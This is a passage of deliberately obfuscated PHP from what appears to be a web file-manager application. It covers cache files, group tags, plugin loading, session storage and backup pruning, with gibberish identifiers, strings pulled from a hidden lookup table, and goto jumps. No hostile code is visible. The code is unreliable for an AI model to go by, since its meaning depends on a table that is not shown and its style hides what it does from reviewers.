self::key($Ö”‡ïÁø); unset(self::$memoryCache[$§š•ØæÃ]); self::clearTimeout(); CacheLock::lock($Ö”‡ïÁø); $ªÕ…ÙÛ’ = self::init()->remove($§š•ØæÃ); CacheLock::unlock($Ö”‡ïÁø); return $ªÕ…ÙÛ’; } public static function removeMemory($ˆá–Êî) { $ƒéÆù¯ = self::key($ˆá–Êî); unset(self::$memoryCache[$ƒéÆù¯]); } public static function clearMemory($‰ù“â±³ = false) { if ($‰ù“â±³) { $‰ù“â±³ = self::key($‰ù“â±³); unset(self::$memoryCache[$‰ù“â±³]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‘ÆÜ‘œ][950])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‘ÆÜ‘œ][951])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ç¾‚ã®, $É×ÀöşÍ) { $×á¸‚ò« =& $_SERVER[‘ÆÜ‘œ]; $this->cachePath = $ç¾‚ã®[$×á¸‚ò«[87]]; $this->prefix = $×á¸‚ò«[952]; $this->cacheTime = $É×ÀöşÍ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ıĞäà¢º) { $»ÑÉéÇ =& $_SERVER[‘ÆÜ‘œ]; $ıĞäà¢º = str_replace(array($»ÑÉéÇ[953], $»ÑÉéÇ[98], $»ÑÉéÇ[76]), $»ÑÉéÇ[954], $ıĞäà¢º); return $this->cachePath . $»ÑÉéÇ[955] . $ıĞäà¢º . $»ÑÉéÇ[956]; } public function set($âšï–®à, $òø‚Ï®Î, $ÂìÄª•¤ = false) { $ÂìÄª•¤ = $ÂìÄª•¤ ? $ÂìÄª•¤ : $this->cacheTime; $ÓÜ—Œ½ò = $this->getFile($âšï–®à); if (file_put_contents($ÓÜ—Œ½ò, $this->prefix . $òø‚Ï®Î, LOCK_EX)) { @touch($ÓÜ—Œ½ò, intval(time() + $ÂìÄª•¤)); clearstatcache(); return !0; } @unlink($ÓÜ—Œ½ò); return !1; } public function get($ªß¤àå) { $ »©§ÌÔ = $this->getFile($ªß¤àå); if (file_exists($ »©§ÌÔ) && filemtime($ »©§ÌÔ) < time()) { @unlink($ »©§ÌÔ); return !1; } $ı¼¡àÍÂ = @file_get_contents($ »©§ÌÔ); return substr($ı¼¡àÍÂ, strlen($this->prefix)); } public function remove($¨ßÓ„èİ) { $õá» = $this->getFile($¨ßÓ„èİ); return @unlink($õá»); } public function deleteAll() { $àóßİ™‚ =& $_SERVER[‘ÆÜ‘œ]; $°‹›ŸÊ± = scandir($this->cachePath); foreach ($°‹›ŸÊ± as $çÊ¥Ş½¯) { $Ë‰½«½Â = $this->cachePath . $çÊ¥Ş½¯; if (strpos($Ë‰½«½Â, $àóßİ™‚[956]) && strpos($Ë‰½«½Â, $àóßİ™‚[957])) { @unlink($Ë‰½«½Â); } } } public function clearTimeout() { $ìµË”—¡ =& $_SERVER[‘ÆÜ‘œ]; $ÛÔ¹º¾á = scandir($this->cachePath); foreach ($ÛÔ¹º¾á as $ğèÃ¨î¸) { $ŠßÀììƒ = $this->cachePath . $ğèÃ¨î¸; if (strpos($ŠßÀììƒ, $ìµË”—¡[956]) && strpos($ŠßÀììƒ, $ìµË”—¡[957]) && filemtime($ŠßÀììƒ) < time()) { @unlink($ŠßÀììƒ); } } } } goto F§‰ìÚİ­; EÎëâ·á©Å: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ó±Ö¹) { $ÁÛ¥ä€ =& $_SERVER[‘ÆÜ‘œ]; return array($ÁÛ¥ä€[2246] => array($ó±Ö¹[0], $ÁÛ¥ä€[2247]), $ÁÛ¥ä€[2248] => array($ó±Ö¹[0], $ÁÛ¥ä€[2249])); } protected function ___get($¾³‹Š©‹) { $ĞÂöšÕ† =& $_SERVER[‘ÆÜ‘œ]; $¼‡¡íÚ• = Model($ĞÂöšÕ†[613])->metaGet($¾³‹Š©‹, $ĞÂöšÕ†[2250]); $€›¸ñáÊ = json_decode($¼‡¡íÚ•, !0); return $€›¸ñáÊ ? $€›¸ñáÊ : array($ĞÂöšÕ†[2251] => $ĞÂöšÕ†[91], $ĞÂöšÕ†[455] => array()); } protected function ___listData($×Ş‡ä¶) { $¾ÏÖØšİ =& $_SERVER[‘ÆÜ‘œ]; $Ôµø—— = array($¾ÏÖØšİ[1921] => 0, $¾ÏÖØšİ[581] => array($¾ÏÖØšİ[2252], 0), $¾ÏÖØšİ[519] => $¾ÏÖØšİ[1442] . $×Ş‡ä¶); $Ä”ò°ë = $¾ÏÖØšİ[2253]; $€¾€§Â = $this->field($Ä”ò°ë)->where($Ôµø——)->order($¾ÏÖØšİ[2254])->select(); return $€¾€§Â ? $€¾€§Â : array(); } protected function set($·Ü«ÜËß, $¸–ßæº) { $¾—®­Ö• =& $_SERVER[‘ÆÜ‘œ]; $¸–ßæº = $¸–ßæº ? $¸–ßæº : array($¾—®­Ö•[2251] => $¾—®­Ö•[91], $¾—®­Ö•[455] => array()); return Model($¾—®­Ö•[613])->metaSet($·Ü«ÜËß, $¾—®­Ö•[2250], json_encode($¸–ßæº)); } protected function getByTagID($ÁûŠÕ€£, $Üïûî) { $ˆŸâ‘ˆò =& $_SERVER[‘ÆÜ‘œ]; if (!$ÁûŠÕ€£ || !$Üïûî) { return !1; } if (!Model($ˆŸâ‘ˆò[613])->getInfoSimple($ÁûŠÕ€£)) { return !1; } $¹ûÒÀ´ = $this->get($ÁûŠÕ€£); if (!$¹ûÒÀ´ || !isset($¹ûÒÀ´[$ˆŸâ‘ˆò[455]])) { return !1; } $¹Ç°ˆ¯ = array_find_by_field($¹ûÒÀ´[$ˆŸâ‘ˆò[455]], $ˆŸâ‘ˆò[495], $Üïûî); return is_array($¹Ç°ˆ¯) ? $¹Ç°ˆ¯ : !1; } public function listSource($Ó‘’¬ßî, $¤ı‚·†ñ) { $ÌıÚÄ¸ =& $_SERVER[‘ÆÜ‘œ]; if ($¤ı‚·†ñ && !is_array($¤ı‚·†ñ)) { $¤ı‚·†ñ = array($¤ı‚·†ñ); } $³Œæ¢‹ = $this->get($Ó‘’¬ßî); $±ğÔÙ‹ş = array_to_keyvalue($³Œæ¢‹[$ÌıÚÄ¸[455]], $ÌıÚÄ¸[495]); $—õ®ş’É = array_to_keyvalue($³Œæ¢‹[$ÌıÚÄ¸[606]], $ÌıÚÄ¸[495]); $’ÏİÛÛˆ = $this->listData($Ó‘’¬ßî); $™ÆßÜÓè = array(); foreach ($¤ı‚·†ñ as $Ë‰¬Œ˜‘) { $è˜–Êóø = $±ğÔÙ‹ş[$Ë‰¬Œ˜‘]; $€¦å•‚Ï = _get($è˜–Êóø, $ÌıÚÄ¸[606]); if (!$è˜–Êóø || !$€¦å•‚Ï || !$—õ®ş’É[$€¦å•‚Ï]) { continue; } if (!$™ÆßÜÓè[$€¦å•‚Ï]) { $™ÆßÜÓè[$€¦å•‚Ï] = array(); } $™ÆßÜÓè[$€¦å•‚Ï][] = $Ë‰¬Œ˜‘; } $š‘¹İÂ† = array(); $áúÈãÔ = array(); foreach ($’ÏİÛÛˆ as $—µäúù) { $àµ¯ÕÆ = $—µäúù[$ÌıÚÄ¸[87]]; $è˜–Êóø = $±ğÔÙ‹ş[$—µäúù[$ÌıÚÄ¸[523]]]; $€¦å•‚Ï = _get($è˜–Êóø, $ÌıÚÄ¸[606]); if (!$è˜–Êóø || !$€¦å•‚Ï || !$™ÆßÜÓè[$€¦å•‚Ï] || !$àµ¯ÕÆ) { continue; } if (!in_array($—µäúù[$ÌıÚÄ¸[523]], $™ÆßÜÓè[$€¦å•‚Ï])) { continue; } if (!$š‘¹İÂ†[$àµ¯ÕÆ]) { $š‘¹İÂ†[$àµ¯ÕÆ] = array(); } $š‘¹İÂ†[$àµ¯ÕÆ][] = $€¦å•‚Ï; } foreach ($š‘¹İÂ† as $àµ¯ÕÆ => $‚ô¹“ê˜) { if (count($‚ô¹“ê˜) != count($™ÆßÜÓè)) { continue; } $áúÈãÔ[] = $àµ¯ÕÆ; } if (!$¤ı‚·†ñ) { $áúÈãÔ = array_to_keyvalue($’ÏİÛÛˆ, $ÌıÚÄ¸[12], $ÌıÚÄ¸[87]); } $áúÈãÔ = array_unique($áúÈãÔ); if (!$áúÈãÔ) { return array(); } $âïá°˜ = array($ÌıÚÄ¸[514] => array($ÌıÚÄ¸[515], $áúÈãÔ), $ÌıÚÄ¸[597] => $Ó‘’¬ßî, $ÌıÚÄ¸[189] => SourceModel::TYPE_GROUP); $ÒÓ»í°‹ = Model($ÌıÚÄ¸[1484])->listSource($âïá°˜); if (!$ÒÓ»í°‹ || count($áúÈãÔ) == $ÒÓ»í°‹[$ÌıÚÄ¸[452]][$ÌıÚÄ¸[453]]) { return $ÒÓ»í°‹; } $‹ç²ÛœÕ = array(); $¸Ñçàë• = array_to_keyvalue($ÒÓ»í°‹[$ÌıÚÄ¸[85]], $ÌıÚÄ¸[12], $ÌıÚÄ¸[192]); $„ìÙ„” = array_to_keyvalue($ÒÓ»í°‹[$ÌıÚÄ¸[86]], $ÌıÚÄ¸[12], $ÌıÚÄ¸[192]); $‚”úİéÛ = array_merge($„ìÙ„”, $¸Ñçàë•); foreach ($áúÈãÔ as $àµ¯ÕÆ) { if (!in_array($àµ¯ÕÆ, $‚”úİéÛ)) { $‹ç²ÛœÕ[] = $àµ¯ÕÆ; } } if ($‹ç²ÛœÕ) { $this->removeBySource($Ó‘’¬ßî, $‹ç²ÛœÕ); } return $ÒÓ»í°‹; } protected function addToTag($•Â¢ˆÔŞ, $ˆØë‘˜, $ÊâŠÖŠ) { $ä©À­øà =& $_SERVER[‘ÆÜ‘œ]; if (!$this->getByTagID($•Â¢ˆÔŞ, $ÊâŠÖŠ) || !$ˆØë‘˜) { return !1; } if (!Model($ä©À­øà[939])->pathInfo($ˆØë‘˜)) { return !1; } $ÎËóûî = array($ä©À­øà[1921] => 0, $ä©À­øà[581] => $ÊâŠÖŠ, $ä©À­øà[518] => $ˆØë‘˜, $ä©À­øà[519] => $ä©À­øà[2255] . $•Â¢ˆÔŞ, $ä©À­øà[517] => $ä©À­øà[12], $ä©À­øà[2140] => 0); if ($this->where($ÎËóûî)->find()) { return !1; } return $this->add($ÎËóûî); } protected function removeFromTag($·Å˜¨Ì÷, $ÉœÅòÄÕ, $³²ÌäÙ) { $ŠÊ‹§¢Ü =& $_SERVER[‘ÆÜ‘œ]; if (!$this->getByTagID($·Å˜¨Ì÷, $³²ÌäÙ) || !$ÉœÅòÄÕ) { return !1; } if (is_array($ÉœÅòÄÕ)) { $ÉœÅòÄÕ = array($ŠÊ‹§¢Ü[7], $ÉœÅòÄÕ); } $ÁÚØÇ­æ = array($ŠÊ‹§¢Ü[1921] => 0, $ŠÊ‹§¢Ü[581] => $³²ÌäÙ, $ŠÊ‹§¢Ü[519] => $ŠÊ‹§¢Ü[2255] . $·Å˜¨Ì÷, $ŠÊ‹§¢Ü[518] => $ÉœÅòÄÕ); return $this->where($ÁÚØÇ­æ)->delete(); } protected function removeByTag($šôßÙ­Á, $Ï†Æí–è) { $ÅçúÄ÷Ù =& $_SERVER[‘ÆÜ‘œ]; if (!$this->getByTagID($šôßÙ­Á, $Ï†Æí–è)) { return !1; } $èêÉÈÔ… = array($ÅçúÄ÷Ù[1921] => 0, $ÅçúÄ÷Ù[581] => $Ï†Æí–è, $ÅçúÄ÷Ù[519] => $ÅçúÄ÷Ù[2255] . $šôßÙ­Á); return $this->where($èêÉÈÔ…)->delete(); } protected function removeBySource($Ä„ÙèÊÖ, $µ ÇË“µ) { $½‚éİ§€ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ä„ÙèÊÖ || !$µ ÇË“µ) { return !1; } if (is_array($µ ÇË“µ)) { $µ ÇË“µ = array($½‚éİ§€[7], $µ ÇË“µ); } $ŒéœÇÙ± = array($½‚éİ§€[1921] => 0, $½‚éİ§€[518] => $µ ÇË“µ, $½‚éİ§€[581] => array($½‚éİ§€[1132], 0), $½‚éİ§€[519] => $½‚éİ§€[2255] . $Ä„ÙèÊÖ); return $this->where($ŒéœÇÙ±)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\160\154\x75\147\x69\x6e\x4c\151\163\164"; public $field = array("\156\141\x6d\x65", "\x73\x74\x61\164\165\x73", "\162\145\x67\151\x65\x73\164", "\143\157\156\146\151\147"); public function loadList($öñÅÕÀœ = false) { $äõ–¢Ç¥ = array_to_keyvalue($this->listData(), $_SERVER[‘ÆÜ‘œ][32]); if ($öñÅÕÀœ) { return $äõ–¢Ç¥[$öñÅÕÀœ]; } return $äõ–¢Ç¥; } public function init() { $½­¨ğØ =& $_SERVER[‘ÆÜ‘œ]; Hook::trigger($½­¨ğØ[2256]); $™·İ¶×Œ = $this->loadPluginList(); foreach ($™·İ¶×Œ as $¢ Ô½ë° => $ÈºÔşĞ) { $Ô—ƒšƒ = $this->appAllow($¢ Ô½ë°, $ÈºÔşĞ); if (!$Ô—ƒšƒ) { continue; } foreach ($ÈºÔşĞ[$½­¨ğØ[2257]] as $ïêİ¤êØ => $‚ˆ·ƒÇ²) { Hook::bind($ïêİ¤êØ, $‚ˆ·ƒÇ²); } } Hook::trigger($½­¨ğØ[2258]); Hook::trigger(ACTION); } public function appAllow($†İÈ»–ü, $…Ø˜Çà™, $àÍµ·ºñ = true) { $ùœîÕÆ =& $_SERVER[‘ÆÜ‘œ]; $à­Åå©ó = PLUGIN_DIR . $†İÈ»–ü . $ùœîÕÆ[2259]; if (!is_array($…Ø˜Çà™) || !is_array($…Ø˜Çà™[$ùœîÕÆ[2257]]) || $…Ø˜Çà™[$ùœîÕÆ[857]] != 1 || !is_file($à­Åå©ó)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ùœîÕÆ[6]][$ùœîÕÆ[2260]] || !$GLOBALS[$ùœîÕÆ[6]][$ùœîÕÆ[2261]]) { return !0; } $’¦ÑËú¯ = explode($ùœîÕÆ[50], strtolower($GLOBALS[$ùœîÕÆ[6]][$ùœîÕÆ[2261]])); return in_array(strtolower($†İÈ»–ü), $’¦ÑËú¯) ? !1 : !0; } if ($àÍµ·ºñ && !Action($ùœîÕÆ[2262])->checkAuth($†İÈ»–ü)) { return !1; } return !0; } public function unInstall($ä¯æäÇ²) { $Éüü„¡ï =& $_SERVER[‘ÆÜ‘œ]; $¢÷§ÀÃÁ = $this->loadList($ä¯æäÇ²); if (file_exists(PLUGIN_DIR . $ä¯æäÇ²)) { Hook::apply($ä¯æäÇ² . $Éüü„¡ï[2263]); } $this->remove($¢÷§ÀÃÁ[$Éüü„¡ï[495]]); } public function changeStatus($°½ó÷Ú°, $˜”àæÍ) { $”¥Œºİâ =& $_SERVER[‘ÆÜ‘œ]; $É¥à©Áï = $this->loadList($°½ó÷Ú°); if ($˜”àæÍ) { Hook::apply($°½ó÷Ú° . $”¥Œºİâ[2264]); } $this->update($É¥à©Áï[$”¥Œºİâ[495]], array($”¥Œºİâ[2265] => $˜”àæÍ)); } public function appRegist($˜Ü°‚ãî, $œÃ•œ‘Ú) { $ŸšÒ‰ =& $_SERVER[‘ÆÜ‘œ]; $„›¦­È› = $this->loadList($˜Ü°‚ãî); if ($„›¦­È›) { $this->update($„›¦­È›[$ŸšÒ‰[495]], array($ŸšÒ‰[2257] => $œÃ•œ‘Ú)); } else { $ÇĞ‰ä¿ = array($ŸšÒ‰[32] => $˜Ü°‚ãî, $ŸšÒ‰[2257] => $œÃ•œ‘Ú, $ŸšÒ‰[857] => 0, $ŸšÒ‰[6] => $this->getConfigDefault($˜Ü°‚ãî)); $this->insert($ÇĞ‰ä¿); } } public function getConfigDefault($¿éÈ‹êô) { $‹ıØ‡‚± =& $_SERVER[‘ÆÜ‘œ]; $à•¡·“ = array(); $ƒÍ¹©í» = $this->getPackageJson($¿éÈ‹êô); if (!$ƒÍ¹©í» && is_array($ƒÍ¹©í»[$‹ıØ‡‚±[2266]])) { return $à•¡·“; } foreach ($ƒÍ¹©í»[$‹ıØ‡‚±[2266]] as $ ÍÈÎËå => $éßïÊëç) { if (!isset($éßïÊëç[$‹ıØ‡‚±[460]]) || isset($à•¡·“[$ ÍÈÎËå])) { continue; } $à•¡·“[$ ÍÈÎËå] = $éßïÊëç[$‹ıØ‡‚±[460]]; } return $à•¡·“; } public function getPackageJson($Ê‰ Š×–) { return Hook::apply($Ê‰ Š×– . $_SERVER[‘ÆÜ‘œ][2267]); } public function getConfig($úÔÈöÊ¯, $“†¼îµ = false) { $åá Üƒ’ =& $_SERVER[‘ÆÜ‘œ]; $ñ«¬—é = array(); $Ìæ´’Û‚ = $this->loadList($úÔÈöÊ¯); if ($Ìæ´’Û‚ && is_array($Ìæ´’Û‚[$åá Üƒ’[6]])) { $ñ«¬—é = $Ìæ´’Û‚[$åá Üƒ’[6]]; } if (!$ñ«¬—é || $“†¼îµ) { $ñ«¬—é = $this->getConfigDefault($úÔÈöÊ¯); } return $ñ«¬—é; } public function setConfig($£©Ûüá¡, $çûœÇ’¾ = false) { $Šß×¾Éš =& $_SERVER[‘ÆÜ‘œ]; $ïûïÛÍü = $this->loadList($£©Ûüá¡); if (!$ïûïÛÍü) { return !1; } $¡—¤ìÜ÷ = $ïûïÛÍü[$Šß×¾Éš[6]]; if ($çûœÇ’¾ == !1) { $¡—¤ìÜ÷ = array(); $çûœÇ’¾ = $this->getConfigDefault($£©Ûüá¡); } foreach ($çûœÇ’¾ as $îñ„®ù® => $¬¿Ü…¨û) { $¡—¤ìÜ÷[$îñ„®ù®] = is_string($¬¿Ü…¨û) ? trim($¬¿Ü…¨û) : $¬¿Ü…¨û; } $this->update($ïûïÛÍü[$Šß×¾Éš[495]], array($Šß×¾Éš[6] => $¡—¤ìÜ÷)); } public function viewList() { $­Ğ©ÙÚÛ =& $_SERVER[‘ÆÜ‘œ]; $Íü­ê®€ = $this->loadList(); $this->pluginScan($Íü­ê®€); $Íü­ê®€ = $this->loadPluginList(); $Ù¦çÌ£Ñ = array(); foreach ($Íü­ê®€ as $Á®ü¿³ı => $Ì²šíĞ) { $çÉ” ÔÅ = $Ì²šíĞ; unset($Ì²šíĞ[$­Ğ©ÙÚÛ[2257]], $Ì²šíĞ[$­Ğ©ÙÚÛ[6]]); $àáú«ê = PLUGIN_DIR . $Ì²šíĞ[$­Ğ©ÙÚÛ[32]] . $­Ğ©ÙÚÛ[2259]; if (!is_file($àáú«ê)) { continue; } $Èè³Üá„ = Hook::apply($Ì²šíĞ[$­Ğ©ÙÚÛ[32]] . $­Ğ©ÙÚÛ[2267]); if (!is_array($Èè³Üá„)) { continue; } $Ù¦çÌ£Ñ[$Á®ü¿³ı] = array_merge($Ì²šíĞ, $Èè³Üá„); if ($çÉ” ÔÅ[$­Ğ©ÙÚÛ[6]][$­Ğ©ÙÚÛ[1843]] != $Èè³Üá„[$­Ğ©ÙÚÛ[1817]]) { Hook::apply($Ì²šíĞ[$­Ğ©ÙÚÛ[32]] . $­Ğ©ÙÚÛ[2264]); $çÉ” ÔÅ[$­Ğ©ÙÚÛ[6]][$­Ğ©ÙÚÛ[1843]] = $Èè³Üá„[$­Ğ©ÙÚÛ[1817]]; $this->update($Ì²šíĞ[$­Ğ©ÙÚÛ[495]], array($­Ğ©ÙÚÛ[6] => $çÉ” ÔÅ[$­Ğ©ÙÚÛ[6]])); } } return $Ù¦çÌ£Ñ; } private function loadPluginList() { $¥¸¨¨Ä² =& $_SERVER[‘ÆÜ‘œ]; $‰€¨ˆ¾á = $this->loadList(); if (strtolower(MOD) == $¥¸¨¨Ä²[2268]) { return $‰€¨ˆ¾á; } $º’‰Õ”¾ = Hook::trigger($¥¸¨¨Ä²[2269], $‰€¨ˆ¾á); if ($‰€¨ˆ¾á && !$º’‰Õ”¾) { die; } return $º’‰Õ”¾ ? $º’‰Õ”¾ : $‰€¨ˆ¾á; } private function pluginScan($á¶Ú“ëó) { $Ó®ğà÷‰ =& $_SERVER[‘ÆÜ‘œ]; recursion_dir(PLUGIN_DIR, $ƒ¡õî·„, $£¸œËãè, 0); foreach ($ƒ¡õî·„ as $ú‰çÍ‚¨) { $Û³È™úĞ = get_path_this($ú‰çÍ‚¨); if (isset($á¶Ú“ëó[$Û³È™úĞ]) || !file_exists($ú‰çÍ‚¨ . $Ó®ğà÷‰[2270]) || !file_exists($ú‰çÍ‚¨ . $Ó®ğà÷‰[2259])) { continue; } Hook::apply($Û³È™úĞ . $Ó®ğà÷‰[2264]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\x5f\x73\x65\163\163\151\x6f\156"; public function get($›î‡²Öş) { $À‹ßÈâ =& $_SERVER[‘ÆÜ‘œ]; $Ø¯¥ı×€ = $this->where(array($À‹ßÈâ[2271] => $›î‡²Öş))->find(); if (!is_array($Ø¯¥ı×€)) { return !1; } return $Ø¯¥ı×€[$À‹ßÈâ[169]]; } public function set($ää òæ¸, $¤¹¶­æ, $ª°ŒÌùÇ = 3600) { $ßç­Òş =& $_SERVER[‘ÆÜ‘œ]; $ Ã‰À = array($ßç­Òş[2271] => $ää òæ¸, $ßç­Òş[2174] => $¤¹¶­æ, $ßç­Òş[2272] => $ª°ŒÌùÇ + time()); if (Session::get($ßç­Òş[2273])) { $ Ã‰À[$ßç­Òş[1544]] = Session::get($ßç­Òş[2273]); } else { $ Ã‰À[$ßç­Òş[1544]] = 0; } if ($this->get($ää òæ¸)) { return $this->where(array($ßç­Òş[2271] => $ää òæ¸))->save($ Ã‰À); } else { return $this->add($ Ã‰À, array(), !0); } } public function remove($Şø¬¶ë¼) { return $this->where(array($_SERVER[‘ÆÜ‘œ][2271] => $Şø¬¶ë¼))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‘ÆÜ‘œ][2274] . time())->delete(); } } goto F·ƒÄùÀè£; CˆÔŞ›ï ª: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[‘ÆÜ‘œ][855]); $this->init(); $this->keep(); } public function init() { $ì°§è =& $_SERVER[‘ÆÜ‘œ]; $this->isManual(); self::$name = date($ì°§è[856]); if (!($Ûãï£ÓÀ = $this->model->lastItem())) { $Ûãï£ÓÀ = $this->initData(); } else { self::$name = $Ûãï£ÓÀ[$ì°§è[32]]; if ($Ûãï£ÓÀ[$ì°§è[857]] == $ì°§è[91]) { self::$name = date($ì°§è[260]); $”Í“„¹™ = intval(_get($Ûãï£ÓÀ, $ì°§è[858], 0)); if (self::$manual == 0 && $Ûãï£ÓÀ[$ì°§è[32]] == self::$name) { $this->model->remove($Ûãï£ÓÀ[$ì°§è[495]]); } $Ûãï£ÓÀ = $this->initData($”Í“„¹™, $Ûãï£ÓÀ[$ì°§è[859]]); } else { $this->checkStore($Ûãï£ÓÀ[$ì°§è[859]]); } } self::$option = $Ûãï£ÓÀ; } private function isManual() { $«·‘áÒØ = _get($GLOBALS, $_SERVER[‘ÆÜ‘œ][860], 0); $«·‘áÒØ = intval($«·‘áÒØ); self::$manual = $«·‘áÒØ && $«·‘áÒØ == 1 ? 1 : 0; } private function initData($«¸®äúÉ = 0, $Œü‡»” = '') { $‹â€Ğó =& $_SERVER[‘ÆÜ‘œ]; $­Äîöâ« = $this->model->config(); if ($Œü‡»” && $­Äîöâ«[$‹â€Ğó[859]] != $Œü‡»”) { $«¸®äúÉ = 0; } $this->checkStore($­Äîöâ«[$‹â€Ğó[859]]); if (self::$manual == 1) { self::$name .= $‹â€Ğó[11] . date($‹â€Ğó[861]); } $æ¨ìÍÆÊ = array($‹â€Ğó[859] => $­Äîöâ«[$‹â€Ğó[859]], $‹â€Ğó[32] => self::$name, $‹â€Ğó[857] => 0, $‹â€Ğó[169] => $­Äîöâ«[$‹â€Ğó[169]], $‹â€Ğó[862] => self::$manual, $‹â€Ğó[863] => array($‹â€Ğó[864] => array($‹â€Ğó[857] => 0), $‹â€Ğó[865] => array($‹â€Ğó[857] => 0, $‹â€Ğó[866] => 0, $‹â€Ğó[867] => 0, $‹â€Ğó[33] => $‹â€Ğó[12], $‹â€Ğó[868] => 0, $‹â€Ğó[869] => 0), $‹â€Ğó[870] => array($‹â€Ğó[857] => 0, $‹â€Ğó[866] => 0, $‹â€Ğó[867] => 0, $‹â€Ğó[868] => 0, $‹â€Ğó[869] => 0), $‹â€Ğó[231] => array($‹â€Ğó[857] => 0, $‹â€Ğó[871] => 0, $‹â€Ğó[872] => 0, $‹â€Ğó[873] => 0, $‹â€Ğó[874] => 0, $‹â€Ğó[565] => $«¸®äúÉ, $‹â€Ğó[868] => 0, $‹â€Ğó[869] => 0)), $‹â€Ğó[868] => time(), $‹â€Ğó[869] => 0); $¿®ºï± = $this->model->insert($æ¨ìÍÆÊ); $æ¨ìÍÆÊ[$‹â€Ğó[495]] = $¿®ºï±; return $æ¨ìÍÆÊ; } private function checkStore($ç¹°¤…æ) { $æşÚëŠ = Model($_SERVER[‘ÆÜ‘œ][875]); $åªöÀò” = $æşÚëŠ->listData($ç¹°¤…æ); $æşÚëŠ->checkConfig($åªöÀò”); } public static function get() { if (!self::$option) { $²õ²Óü® = Model($_SERVER[‘ÆÜ‘œ][855]); $ÁóÂ½íÊ = $²õ²Óü®->findByName(self::$name); $²õ²Óü®->parseContent($ÁóÂ½íÊ); self::$option = $ÁóÂ½íÊ; } return self::$option; } public static function set($‰ëöü±¡) { $ºœ†éü =& $_SERVER[‘ÆÜ‘œ]; $Ë’¡Ç… = self::get(); foreach ($‰ëöü±¡ as $·ô¡’Ş => $—¨ÄÚ‡) { array_set_value($Ë’¡Ç…, $·ô¡’Ş, $—¨ÄÚ‡); } Model($ºœ†éü[855])->update($Ë’¡Ç…[$ºœ†éü[495]], $Ë’¡Ç…); self::$option = $Ë’¡Ç…; return self::$option; } public function keep() { $ÜÂ¯×­¡ =& $_SERVER[‘ÆÜ‘œ]; $Êß¬ïºÊ = self::get(); if (_get($Êß¬ïºÊ, $ÜÂ¯×­¡[876], 0) == $ÜÂ¯×­¡[91]) { return; } $this->backupKeep($Êß¬ïºÊ); self::set(array($ÜÂ¯×­¡[876] => 1)); } private function backupKeep($¿±›˜) { $áŠö–± =& $_SERVER[‘ÆÜ‘œ]; if (self::$manual == 1) { return; } $ƒ¦èÈÑ¦ = $this->model->listData(); if (empty($ƒ¦èÈÑ¦)) { return; } $ÙîÏ£–´ = array(); $ÆÑğè  = array(); $áÖè‹Ï¹ = date($áŠö–±[877], strtotime($áŠö–±[878])); foreach ($ƒ¦èÈÑ¦ as $°ïòåÓÕ => $ƒ­˜°ôî) { $ŸºÜªø = $ƒ­˜°ôî[$áŠö–±[32]]; if ($°ïòåÓÕ < 7 || $ƒ­˜°ôî[$áŠö–±[862]] == $áŠö–±[91]) { $ÙîÏ£–´[] = $ŸºÜªø; continue; } $íú ºŒ½ = substr($ŸºÜªø, 0, 6); if ($íú ºŒ½ < $áÖè‹Ï¹) { continue; } if (!isset($ÆÑğè [$íú ºŒ½]) || $ŸºÜªø < $ÆÑğè [$íú ºŒ½]) { $ÆÑğè [$íú ºŒ½] = $ŸºÜªø; } if (substr($ŸºÜªø, 6, 2) == $áŠö–±[879]) { $ÆÑğè [$íú ºŒ½] = $ŸºÜªø; } } $ÙîÏ£–´ = array_merge($ÙîÏ£–´, array_values($ÆÑğè )); $ÙîÏ£–´ = array_unique($ÙîÏ£–´); foreach ($ƒ¦èÈÑ¦ as $ƒ­˜°ôî) { $ŸºÜªø = $ƒ­˜°ôî[$áŠö–±[32]]; if (!empty($ŸºÜªø) && in_array($ŸºÜªø, $ÙîÏ£–´)) { continue; } $this->model->remove($ƒ­˜°ôî[$áŠö–±[495]]); $Èä¯è = $this->backupPath($¿±›˜); IO::remove($Èä¯è, !1); } } private function backupPath($ı²Ø£ıÑ) { $šâ×£Í =& $_SERVER[‘ÆÜ‘œ]; static $¿“õÄÑÀ = null; if (is_null($¿“õÄÑÀ)) { $¿“õÄÑÀ = Model($šâ×£Í[880])->get($šâ×£Í[881]); } $±«“šØ¯ = $ı²Ø£ıÑ[$šâ×£Í[32]]; $ó¨æöÀ¬ = substr(md5($šâ×£Í[882] . $¿“õÄÑÀ . $±«“šØ¯), 0, 8); return "\173\x69\157\x3a{$ı²Ø£ıÑ[$šâ×£Í[859]]}\x7d\x2f\x64\x61\164\x61\x62\x61\163\145\57\142\x61\x63\153\x75\160\57" . $±«“šØ¯ . $šâ×£Í[11] . $ó¨æöÀ¬; } public function db() { $‡›ÃÚ‘º =& $_SERVER[‘ÆÜ‘œ]; $ô‘Õ”Ù— = self::get(); if (_get($ô‘Õ”Ù—, $‡›ÃÚ‘º[883], 0) == $‡›ÃÚ‘º[91]) { return !0; } $÷ö˜è¾Í = new BackupDb(); if (!$÷ö˜è¾Í->index()) { return !1; } self::set(array($‡›ÃÚ‘º[883] => 1)); return !0; } public function dbFile() { $•­¤¦£¨ =& $_SERVER[‘ÆÜ‘œ]; $µ’¬¦Öà = self::get(); if (_get($µ’¬¦Öà, $•­¤¦£¨[884], 0) == $•­¤¦£¨[91]) { return !0; } $ËŒğˆ‹¨ = new BackupDbFile(); if (!$ËŒğˆ‹¨->index()) { return !1; } self::set(array($•­¤¦£¨[884] => 1)); return !0; } public function file() { $å•ÜŒş =& $_SERVER[‘ÆÜ‘œ]; $—âúª¹Õ = self::get(); if (_get($—âúª¹Õ, $å•ÜŒş[885], 0) == $å•ÜŒş[91]) { return !0; } if ($—âúª¹Õ[$å•ÜŒş[169]] == $å•ÜŒş[886]) { $Ñ´Å’› = new BackupFile(); if 